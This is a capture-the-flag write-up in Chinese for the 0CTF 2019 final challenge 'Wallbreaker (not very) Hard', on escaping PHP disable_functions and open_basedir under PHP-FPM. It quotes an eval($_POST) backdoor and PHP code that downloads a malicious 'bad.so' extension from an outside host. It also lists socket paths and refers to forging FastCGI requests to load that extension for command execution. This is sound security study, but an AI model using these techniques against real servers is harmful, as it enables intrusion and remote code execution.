# Wallbreaker (not very) Hard

### [English Version](https://github.com/w181496/CTF/blob/master/0ctf2019_final/Wallbreaker%20(not%20very)%20Hard/README_en.md)

## 題目分析

- 這題基本上跟 0CTF 2019 初賽那題環境一樣:
    - PHP-FPM
    - PHP 7.2
    - 更嚴格的 `disable_functions`
        - `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log`
        - 這次不能再用`putenv`了:p
    - `open_basedir: /var/www/html:/tmp`

![](https://github.com/w181496/CTF/blob/master/0ctf2019_final/Wallbreaker%20(not%20very)%20Hard/phpinfo.png)

- 首先這題告訴我們有個backdoor，但要自己去找
- 踹了一下發現有`.index.php.swp`
- backdoor key: `eval($_POST["anfkBJbfqkfqasd"]);`
- 後面就開始繞`disable_functions`和`open_basedir`

## Exploit

- 在初賽時，我偽造 fastcgi 去繞過 `open_basedir` (把設定寫掉)
- 但其實我後來發現可以透過 extension 直接 RCE
- 只要把 `PHP_ADMIN_VALUE` 中的 `extension_dir` 和 `extension` 寫掉就可以載入任意 extension
- 所以我們第一步就是上傳能執行 Command 的 extension:

```php
file_put_contents("/tmp/bad.so", file_get_contents("http://kaibro.tw/bad.so"));
```

- 在偽造 FastCGI Protocol 之前，我們必須先找出他的 UNIX Socket path (如果是走 tcp，就要找到 port):

```php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/php/*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/php/.*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}<br/>";
}
```

=> `/var/run/php/U_wi11_nev3r_kn0w.sock`

- 接著開始偽造 FastCGI Protocol 寫掉設定，這邊可以參考 [payload.php](https://github.com/w181496/FuckFastcgi/blob/master/index.php)
    - 把裡面對應的設定改掉就行

![](https://github.com/w181496/CTF/blob/master/0ctf2019_final/Wallbreaker%20(not%20very)%20Hard/getflag.png)

- RCE Get!
- `/readflag` => `flag{PHP-FPM is awesome and I think the best pratice is chroot your PHP}`

